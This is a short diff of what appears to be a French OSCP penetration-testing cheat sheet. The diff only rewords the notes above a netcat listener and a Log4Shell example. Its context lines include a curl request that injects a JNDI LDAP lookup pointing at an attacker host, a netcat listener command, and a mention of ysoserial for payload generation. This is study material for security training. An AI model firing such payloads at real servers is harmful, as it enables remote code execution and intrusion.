@@ -3951,7 +3957,7 @@ curl -X POST http://target-server.com/login -d "username=${jndi:ldap://attacker-
 ```
 
 
-<p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>
+<p class="oscp-command-note">Netcat : lancer l'écoute locale sur le port de test.</p>
 
 ```bash
 nc -lvnp [listening_port]
@@ -3959,7 +3965,7 @@ nc -lvnp [listening_port]
 ```
 
 
-<p class="oscp-command-note">Exécuter un script shell.</p>
+<p class="oscp-command-note">Log4Shell : exemples de commande Bash et d'expression JNDI, à distinguer avant usage.</p>
 
 ```bash
 # Vous pouvez également utiliser un outil comme ysoserial (pour Windows) pour générer la charge utile.
